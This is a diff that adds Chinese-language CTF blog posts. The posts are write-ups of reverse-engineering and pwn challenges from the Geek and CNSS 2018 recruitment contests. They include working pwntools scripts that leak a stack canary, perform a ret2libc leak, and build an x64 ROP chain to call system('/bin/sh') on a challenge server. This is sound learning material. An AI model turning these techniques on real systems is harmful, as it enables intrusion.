@@ -203,6 +203,280 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-geek-no-gdb" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/19/geek-no-gdb/" class="article-date">
+      <time datetime="2018-10-19T08:01:32.000Z" itemprop="datePublished">2018-10-19</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/19/geek-no-gdb/">geek-no-gdb</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><a href="http://geek.sycsec.com/index.php/main/view/challenges" target="_blank" rel="noopener">题目地址</a> 话说好像是要用gdb调试的，然而之前一直没用过gdb，对着教程弄了一会，也许是因为编译时没有-g导致调试不起来，只能拖进ida看看，发现大部分函数也是能看的，不过最关键的一段函数却无法使用f5，只能怼汇编了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">sub_400716      proc near               ; CODE XREF: main+B0↓p</span><br><span class="line"></span><br><span class="line">s               = qword ptr -68h</span><br><span class="line">var_54          = dword ptr -54h</span><br><span class="line">s2              = byte ptr -50h</span><br><span class="line">var_48          = qword ptr -48h</span><br><span class="line">var_40          = qword ptr -40h</span><br><span class="line">var_38          = qword ptr -38h</span><br><span class="line">var_30          = qword ptr -30h</span><br><span class="line">var_28          = word ptr -28h</span><br><span class="line">var_18          = qword ptr -18h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">                push    rbp</span><br><span class="line">                mov     rbp, rsp</span><br><span class="line">                nop</span><br><span class="line">                sub     rsp, 68h</span><br><span class="line">                mov     [rbp+s], rdi</span><br><span class="line">                mov     rax, fs:28h</span><br><span class="line">                mov     [rbp+var_18], rax</span><br><span class="line">                xor     eax, eax</span><br><span class="line">                mov     rax, &apos;kVPSOwmg&apos;</span><br><span class="line">                mov     qword ptr [rbp+s2], rax</span><br><span class="line">                mov     rax, &apos;YkQ\@kQV&apos;</span><br><span class="line">                mov     [rbp+var_48], rax</span><br><span class="line">                mov     rax, &apos;QC[Dk@G[&apos;</span><br><span class="line">                mov     [rbp+var_40], rax</span><br><span class="line">                mov     rax, &apos;kg&#123;kXARF&apos;</span><br><span class="line">                mov     [rbp+var_38], rax</span><br><span class="line">                mov     rax, &apos;FQSSAVQP&apos;</span><br><span class="line">                mov     [rbp+var_30], rax</span><br><span class="line">                mov     [rbp+var_28], &apos;I&apos;</span><br><span class="line">                mov     [rbp+var_54], 0</span><br><span class="line">                jmp     short loc_4007A3</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">loc_400787:                             ; CODE XREF: sub_400716+A2↓j</span><br><span class="line">                mov     eax, [rbp+var_54]</span><br><span class="line">                cdqe</span><br><span class="line">                movzx   eax, [rbp+rax+s2]</span><br><span class="line">                xor     eax, 34h</span><br><span class="line">                mov     edx, eax</span><br><span class="line">                mov     eax, [rbp+var_54]</span><br><span class="line">                cdqe</span><br><span class="line">                mov     [rbp+rax+s2], dl</span><br><span class="line">                add     [rbp+var_54], 1</span><br><span class="line"></span><br><span class="line">loc_4007A3:                             ; CODE XREF: sub_400716+6F↑j</span><br><span class="line">                mov     eax, [rbp+var_54]</span><br><span class="line">                movsxd  rbx, eax</span><br><span class="line">                mov     rax, [rbp+s]</span><br><span class="line">                mov     rdi, rax        ; s</span><br><span class="line">                call    _strlen</span><br><span class="line">                cmp     rbx, rax</span><br><span class="line">                jb      short loc_400787</span><br><span class="line">                lea     rdx, [rbp+s2]</span><br><span class="line">                mov     rax, [rbp+s]</span><br><span class="line">                mov     rsi, rdx        ; s2</span><br><span class="line">                mov     rdi, rax        ; s1</span><br><span class="line">                call    _strcmp</span><br><span class="line">                test    eax, eax</span><br><span class="line">                jnz     short loc_4007DD</span><br><span class="line">                mov     edi, offset s   ; &quot;Yeah!Prison break!&quot;</span><br><span class="line">                call    _puts</span><br><span class="line">                jmp     short loc_4007E7</span><br><span class="line">; ---------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">loc_4007DD:                             ; CODE XREF: sub_400716+B9↑j</span><br><span class="line">                mov     edi, offset aNoYouFailed ; &quot;No!You Failed&quot;</span><br><span class="line">                call    _puts</span><br></pre></td></tr></table></figure>
+<p>一通操作就是把一开始的输入读入s，然后再把一个字符串读入s2，如果对于s的每一位异或0x34后与s2相等就ok啦，所以flag=s2^0x34，逆运算脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s2=&quot;gmwOSPVkVQk@\QkY[G@kD[CQFRAXk&#123;gkPQVASSQFI&quot;</span><br><span class="line">flag=&apos;&apos;.join([chr(ord(i)^0x34) for i in s2])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
+<p>不知道怎么用gdb真是鶸啊orz</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CNSSrecruit-3" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/15/CNSSrecruit-3/" class="article-date">
+      <time datetime="2018-10-15T15:05:31.000Z" itemprop="datePublished">2018-10-15</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/15/CNSSrecruit-3/">CNSSrecruit-3</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="GuessPigeon3"><a href="#GuessPigeon3" class="headerlink" title="GuessPigeon3"></a>GuessPigeon3</h1><p>开了canary保护，提供了libc.so文件。<br>参考文章<a href="https://blog.csdn.net/publicStr/article/details/80344321" target="_blank" rel="noopener">write函数泄露+用地址跳回重执行主函数</a></p>
+<p>guess函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned int guess()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+8h] [ebp-70h]</span><br><span class="line">  unsigned int v2; // [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  memset(&amp;buf, 0, 0x64u);</span><br><span class="line">  puts(&quot;You You have two chances. Please input your guess:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100u);</span><br><span class="line">  printf(&quot;You guessed the pigeon number is %s .\nI&apos;m sorry, you guessed wrong.&quot;, &amp;buf);</span><br><span class="line">  puts(&quot;Please input your guess again:&quot;);</span><br><span class="line">  read(0, &amp;buf, 0x100u);</span><br><span class="line">  puts(&quot;You&apos;ve been fooled.There are no pigenos here!\n Good bye~&quot;);</span><br><span class="line">  return __readgsdword(0x14u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>v2就是canary，buf存在栈溢出。</p>
+<p>ida打开libc.so.6，找到system的偏移地址。/bin/sh字符串的偏移地址可以用winhex打开libc文件查找（详见参考文章，很给力）。</p>
+<p>第一次输入后会对输入进行一次输出，可以利用这一次输出把canary带出来，在第二次输入中使用来跳过canary保护。</p>
+<p>然后第二次输入时利用栈溢出覆盖掉guess函数的返回地址，调用write函数，输出write函数的真实地址来计算libc的起始地址，就可以计算出system函数的真实地址。同时将write函数的返回地址填充为main函数的地址，这样在第二次输入完之后又会再次进入main函数。</p>
+<p>这样再次进入main函数之后，就可以开shell了。脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf1=ELF(&quot;./GuessPigeon3&quot;)</span><br><span class="line">elf2=ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">plt_write=elf1.plt[&quot;write&quot;]</span><br><span class="line">got_write=elf1.got[&quot;write&quot;]</span><br><span class="line">system_libc=0x3ada0</span><br><span class="line">bin_sh_libc=0x15ba0b</span><br><span class="line"></span><br><span class="line">sh=remote(&quot;132.232.34.26&quot;,8888)</span><br><span class="line">sh.recvuntil(&quot;token:&quot;)</span><br><span class="line">sh.sendline(&quot;GuessPigeon3&quot;)</span><br><span class="line">sh.recvuntil(&quot;guess:&quot;)</span><br><span class="line">sh.sendline(&apos;a&apos;*95+&quot;abcde&quot;)</span><br><span class="line">sh.recvuntil(&quot;abcde&quot;)</span><br><span class="line">sh.recv(1)</span><br><span class="line">canary=&apos;\x00&apos;+sh.recv(3)</span><br><span class="line">sh.recvuntil(&quot;again:&quot;)</span><br><span class="line">payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(plt_write)+p32(0x080486c4)+p32(1)+p32(got_write)+p32(4)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&apos;bye~\n&apos;)</span><br><span class="line">leak=u32(sh.recv(4))</span><br><span class="line">libc_base=leak-elf2.symbols[&apos;write&apos;]</span><br><span class="line">system=libc_base+system_libc</span><br><span class="line">bin_sh=libc_base+bin_sh_libc</span><br><span class="line">sh.recvuntil(&quot;guess:&quot;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&quot;again:&quot;)</span><br><span class="line">payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(system)+p32(1)+p32(bin_sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>发现程序十秒不输入就会自行结束，所以把cat flag的操作也写进脚本吧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh.sendline(&quot;cd ..&quot;)</span><br><span class="line">sh.sendline(&quot;cat flag_GuessPigeon3&quot;)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>
+<h1 id="诡异的修罗铭文"><a href="#诡异的修罗铭文" class="headerlink" title="诡异的修罗铭文"></a>诡异的修罗铭文</h1>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CNSSrecruit-2" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/14/CNSSrecruit-2/" class="article-date">
+      <time datetime="2018-10-14T14:32:19.000Z" itemprop="datePublished">2018-10-14</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/14/CNSSrecruit-2/">CNSSrecruit-2</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="childNc"><a href="#childNc" class="headerlink" title="childNc"></a>childNc</h1><p>主函数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">v8 = __readfsqword(0x28u);</span><br><span class="line">setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">setvbuf(stderr, 0LL, 2, 0LL);</span><br><span class="line">puts(&quot;Please input two right numbers:&quot;);</span><br><span class="line">__isoc99_scanf(&quot;%d %d&quot;, &amp;v4, &amp;v5);</span><br><span class="line">v6 = v4 + v5;</span><br><span class="line">v7 = v4 - v5;</span><br><span class="line">if ( v4 + v5 != 19 || v7 != 5 )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Try again~&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Gooood!you get shell!Can you find the flag?\n&quot;);</span><br><span class="line">  system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure>
+<p>可以发现输入12和7就可以获得shell</p>
+<h1 id="GuessPigeon"><a href="#GuessPigeon" class="headerlink" title="GuessPigeon"></a>GuessPigeon</h1><p><del>程序自带getshell函数，所以只要找一个栈溢出然后把返回地址修改成getshell的地址就ok了，脚本如下</del></p>
+<p>一开始没看一下有没有开什么保护啥的，结果试了半天也没能成功……后来发现开了canary保护，现场百度一波，找到了大佬的教程<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44069&amp;highlight=pwn入门" target="_blank" rel="noopener">Linux pwn入门教程(9)——stack canary与绕过的思路</a>，不过研究了一晚上发现这一题并不需要用到这篇教程里的东西…..</p>
+<p>主程序如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; // eax</span><br><span class="line">  int v4; // ST1C_4</span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  puts(&quot;Welcome to CNSS Recruit 2018\n&quot;);</span><br><span class="line">  puts(&quot;Let&apos;s guess the pigeon number together!&quot;);</span><br><span class="line">  v3 = time(0);</span><br><span class="line">  srand(v3);</span><br><span class="line">  v4 = rand();</span><br><span class="line">  guess(v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>v3就是canary的值，guess函数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unsigned int __cdecl guess(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  char nptr; // [esp+8h] [ebp-70h]</span><br><span class="line">  unsigned int v3; // [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  puts(&quot;Please input your guess:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%s&quot;, &amp;nptr);</span><br><span class="line">  if ( atoi(&amp;nptr) == a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;My Gooood!You guessed the pigeon number!!&quot;);</span><br><span class="line">    getshell();</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;You are wrong!The pigeon&apos;s number is %d\n try again~&quot;, a1);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br></pre></td></tr></table></figure>
+<p>栈中各变量的分布顺序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nptr</span><br><span class="line">canary</span><br><span class="line">a1</span><br></pre></td></tr></table></figure>
+<p>这里可以通过scanf的栈溢出来修改a1，也就是v4的值。atoi()函数是将字符串转化为整形，例如’0’就会被转换成0，所以scanf输入时我选择全部用’0’填充，到了a1的值时使用p32(0)把a1修改为0，这样就使得guess函数中的判断成立，在函数结束之前进入了shell，无所谓是不是触发canary保护了。</p>
+<p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&quot;2&quot;)</span><br><span class="line">sh=remote(&quot;132.232.34.26&quot;,8888)</span><br><span class="line">print sh.recvuntil(&apos;token:&apos;)</span><br><span class="line">sh.sendline(&apos;GuessPigeon&apos;)</span><br><span class="line">print sh.recvuntil(&apos;guess:&apos;)</span><br><span class="line">payload=&apos;0&apos;*0x78+p32(0)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="GuessPigeon2"><a href="#GuessPigeon2" class="headerlink" title="GuessPigeon2"></a>GuessPigeon2</h1><p>本题参考了i春秋上面大佬的教程<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42530&amp;highlight=pwn入门" target="_blank" rel="noopener">Linux pwn入门教程(3)——ROP技术</a></p>
+<p>主函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int result; // eax</span><br><span class="line">char buf; // [rsp+0h] [rbp-70h]</span><br><span class="line"></span><br><span class="line">puts(&quot;Please input your guess:&quot;);</span><br><span class="line">__isoc99_scanf((__int64)&quot;%s&quot;, (__int64)&amp;buf);</span><br><span class="line">puts(&quot;You&apos;ve been fooled.There are no pigenos here!\n Good bye~&quot;);</span><br><span class="line">puts(&quot;Do you want to get hint? yes/no?&quot;);</span><br><span class="line">read(0, &amp;buf, 0x100uLL);</span><br><span class="line">result = strcmp(&amp;buf, &quot;yes&quot;);</span><br><span class="line">if ( !result )</span><br><span class="line">  result = printf(&quot;Do you know \&quot;%s\&quot;\n&quot;, s);</span><br><span class="line">return result;</span><br></pre></td></tr></table></figure>
+<p>函数列表里有system函数，只是参数不是/bin/sh。buf存在栈溢出，并且有两次输入都是输入到buf，所以第一次输入随便输入点什么，第二次输入时利用栈溢出调用system函数，并且发现s中储存的字符串正好是/bin/sh，可以用来作为system函数的参数。但是这个和之前做的那题有system函数没参数的不一样，这题是64位的，那题是32位的。</p>
+<blockquote>
+<p><strong>“在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给RDI赋值的办法。由于我们可以控制栈，根据ROP的思想，我们需要找到的就是pop rdi; ret，前半段用于赋值rdi，后半段用于跳到其他代码片段。”</strong></p>
+</blockquote>
+<p>所以我们需要找一个命令pop rdi,这里可以使用ROPgadget</p>
+<p><code>ROPgadget --binary 1 | grep &quot;pop rdi&quot;</code></p>
+<p>这里找到的地址是0x400933,同时在ida中查看到call system的地址是0x4007cf,s的地址是0x600e20，利用这些就可以编写payload。</p>
+<p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf=ELF(&quot;1&quot;)</span><br><span class="line">sh=remote(&quot;132.232.34.26&quot;,8888)</span><br><span class="line">sh.recvuntil(&apos;token:&apos;)</span><br><span class="line">sh.sendline(&apos;GuessPigeon2&apos;)</span><br><span class="line">sh.recvuntil(&apos;Please input your guess:&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;yes/no?&apos;)</span><br><span class="line">payload=&apos;a&apos;*0x78+p64(0x400933)+p64(0x600e20)+p64(0x4007cf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>成功获取shell，cd ..之后cat flag。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-CNSSrecruit-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/10/13/CNSSrecruit-1/" class="article-date">
+      <time datetime="2018-10-13T08:28:12.000Z" itemprop="datePublished">2018-10-13</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/10/13/CNSSrecruit-1/">CNSSrecruit-1</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="RE签到题"><a href="#RE签到题" class="headerlink" title="RE签到题"></a>RE签到题</h1><p>shift+f12查看字符串</p>
+<h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><p>一个小游戏，得到100w分得到flag，既然能用CE,为什么不用呢XD</p>
+<h1 id="海南鸽子"><a href="#海南鸽子" class="headerlink" title="海南鸽子"></a>海南鸽子</h1><p>关键部分：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scanf(&quot;%19s&quot;, &amp;v6);</span><br><span class="line">sub_401005(&amp;v6, (int)&amp;v2);</span><br><span class="line">for ( i = 0; i &lt; strlen(&amp;v2); ++i )</span><br><span class="line">  --*(&amp;v2 + i);</span><br><span class="line">if ( !strcmp(&amp;v2, &quot;X14yb2sEVk8BXWMkMiQ8&quot;) )</span><br><span class="line">  printf(&quot;Success!\n\n&quot;);</span><br><span class="line">else</span><br><span class="line">  printf(aWrongFlagO);</span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure>
+<p>sub401005是base64加密，判断方式为如果输入进行base64加密后，再每一位减去1,若与X14yb2sEVk8BXWMkMiQ8相等则success，逆运算得到flag。</p>
+<h1 id="推箱子游戏"><a href="#推箱子游戏" class="headerlink" title="推箱子游戏"></a>推箱子游戏</h1><p>题目直接提示了关键点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(&quot;./score.data&quot;, &quot;rb+&quot;);</span><br><span class="line">  if ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr = 0LL;</span><br><span class="line">    v6 = 0LL;</span><br><span class="line">    v0 = 16LL;</span><br><span class="line">    fread(&amp;ptr, 0x10uLL, 1uLL, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    puts(&quot;-----Score Board-----&quot;);</span><br><span class="line">    LODWORD(v3) = 0;</span><br><span class="line">    while ( (signed int)v3 &lt;= 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (unsigned int)(v3 + 1);</span><br><span class="line">      printf(&quot;level%d: %d steps\n&quot;, v0, *((unsigned int *)&amp;ptr + (signed int)v3), v3);</span><br><span class="line">      LODWORD(v3) = v3 + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( ptr == 0x2500000011LL )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = -8977570383032666059LL;</span><br><span class="line">      v8 = 4503996766676335161LL;</span><br><span class="line">      v9 = 51;</span><br><span class="line">      v10 = 105;</span><br><span class="line">      v11 = 52;</span><br><span class="line">      v12 = -122;</span><br><span class="line">      v13 = 78;</span><br><span class="line">      v14 = 105;</span><br><span class="line">      v15 = 102;</span><br><span class="line">      v16 = 67;</span><br><span class="line">      v17 = -124;</span><br><span class="line">      v18 = 108;</span><br><span class="line">      v19 = 58;</span><br><span class="line">      v20 = 51;</span><br><span class="line">      v21 = 75;</span><br><span class="line">      v22 = -106;</span><br><span class="line">      v23 = 0;</span><br><span class="line">      for ( HIDWORD(v3) = 0; SHIDWORD(v3) &lt;= 29; ++HIDWORD(v3) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_BYTE *)&amp;v7 + SHIDWORD(v3)) -= 48;</span><br><span class="line">        *((_BYTE *)&amp;v7 + SHIDWORD(v3)) ^= 0x66u;</span><br><span class="line">      &#125;</span><br><span class="line">      v0 = (unsigned __int64)&amp;v7;</span><br><span class="line">      printf(&quot;\n%s\n&quot;, &amp;v7, v3);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里有两个选择，一是根据<code>ptr==0x2500000011</code>，将score.data中的数据改成<code>1100 0000 2500 0000 0000 0000 0000 0000</code>,然后再打开scoreboard就可以触发条件得到flag，二是直接根据生成flag的函数计算出flag。</p>
+<h1 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h1><p>源码define了很多哲学词汇，例如deep♂dark♂fantasy。用sublime搜索全部然后替换掉就看起来很明白了，不过要注意的是，定义变量时也定义了很多带_的变量，不注意的话可能会替换错误，处理后代码如下：</p>
